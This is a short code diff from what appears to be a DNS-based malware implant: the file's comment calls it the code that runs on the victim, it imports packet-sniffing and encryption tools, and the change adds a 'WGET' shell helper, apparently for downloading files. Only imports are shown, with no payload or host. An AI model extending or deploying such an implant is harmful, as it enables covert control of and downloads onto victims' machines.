@@ -1,7 +1,7 @@
 # This will contain the code which will run on the victim. i.e. the actual malware
 from scapy.all import sniff, UDP, DNSQR, DNSRR, IP, DNS, send
 from utils.encryption import StreamEncryption
-from utils.shell import LIST
+from utils.shell import LIST, WGET
 import os
 from random import randint
 import argparse
